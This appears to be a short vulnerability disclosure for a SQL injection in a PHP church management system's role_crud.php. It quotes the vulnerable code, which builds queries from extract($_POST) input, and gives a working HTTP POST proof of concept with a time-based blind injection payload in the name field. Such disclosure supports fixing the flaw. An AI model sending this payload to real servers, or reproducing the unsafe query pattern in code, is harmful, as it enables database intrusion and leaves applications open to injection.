### Vulnerability file address

`church/admin/app/role_crud.php` from line 34,The `extract($_POST);` parameter is controllable and the `$_POST['name']` is not protected from sql injection, line 37 `$stmt = $conn->prepare("UPDATE groups set name='$name',description='$description' where id='".$_POST['id']."'");` ,line 38 `$stmt->execute();` performs a SQL query, causing SQL injection

```php
if (isset($_POST['update'])) {
      
      
     extract($_POST);
     $stmt = $conn->prepare("delete  from permission_role where group_id='".$_POST['id']."'");
    $stmt->execute();
    $stmt = $conn->prepare("UPDATE groups set name='$name',description='$description' where id='".$_POST['id']."'");
    $stmt->execute();

$checkItem = $_POST["checkItem"];
//print_r($_POST);
 $a = count($checkItem);  
for($i=0;$i<$a;$i++){
 $id = $_POST['id'];
         $sql="insert into permission_role(permission_id,group_id)values('$checkItem[$i]','$id')";
          $execute = $conn->query($sql);
        
       }
    
        $_SESSION['update'] = "update";
        header("location:../manage_role.php");
    }
```

### POC

```http
POST /church/admin/app/role_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

update=1&checkItem[]=1&name='||(SELECT 0x54554a62 WHERE 7109=7109 AND (SELECT 4242 FROM (SELECT(SLEEP(5)))wnYS))||'&description=member11&id=123
```

### Attack results pictures

![image-20250505205901513](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505052059554.png)